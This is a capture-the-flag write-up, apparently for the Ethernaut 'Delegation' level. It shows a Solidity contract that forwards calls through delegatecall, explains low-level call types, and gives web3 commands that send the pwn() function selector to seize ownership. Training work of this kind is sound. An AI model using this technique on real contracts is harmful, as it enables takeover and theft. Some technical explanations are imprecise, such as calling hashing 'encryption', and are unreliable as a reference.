# Delegation

```javascript
pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}
```

From Solidity document:
* `<address>.call(bytes memory) returns (bool, bytes memory)`:
issue low-level **CALL** with the given payload, returns success condition and return data, forwards all available gas, adjustable.
* `<address>.delegatecall(bytes memory) returns (bool, bytes memory)`:
issue low-level **DELEGATECALL** with the given payload, returns success condition and return data, forwards all available gas, adjustable.

I think that is not that clear, here I summary all three call in Solidity:

* call()
    This one will call target function, and move all exec env to callee contract, if there's any valuable declaired in same name, callee contract's valuable will take charge. 
* callcode()
    This one will call target function, and move all target function in callee to caller's env, if there's any valuable declaired in same name, caller contract's valuable will take charge. `msg.sender` in `callcode()` will always be caller's address.
* delegatecall()
    Same as `callcode()`, but `msg.sender` in `delegatecall()` will always be first one `delegatecall()` caller's address. 
    
Therefore, if `Delegation` use `callcode()` in its callback function, when it call its `Delegate` instance, `Delegate` will get `Delegation`'s address as `msg.sender`.

However, if `Delegation` use `delegatecall()` in its callback function just like current state, when `ddelegatecall()` call `Delegate`, there will be `Delegation`'s caller's address, you, in `msg.sender`.

Before we start use `delegatecall()` to call `Delegation`'s `Delegate`'s `pwn()` function, there's still a important point we should concern for it:

How to use `delegatecall()` to call function?

In Solidity, its `Contract ABI Specification` use `keccak256`, also known as `SHA3`, to encrypt the function name, then take only 4 bytes in head as map to find which one has been called.

Careful, although it take only 4 bytes, to make it as hex value, they will append after `0x`, so just slice 10 charaters.

```javascript
contract.owner()
contract.sendTransaction({data:web3.sha3("pwn()").slice(0,10)});
contract.owner()
```
or
```javascript
contract.owner()
web3.eth.sendTransaction({from:player,to:instance,data:web3.sha3("pwn()").slice(0,10),gas: 1111111},function(x,y){console.error(y)});
//The MetaMask Web3 object does not support synchronous methods like eth_sendTransaction without a callback parameter.
contract.owner()
```
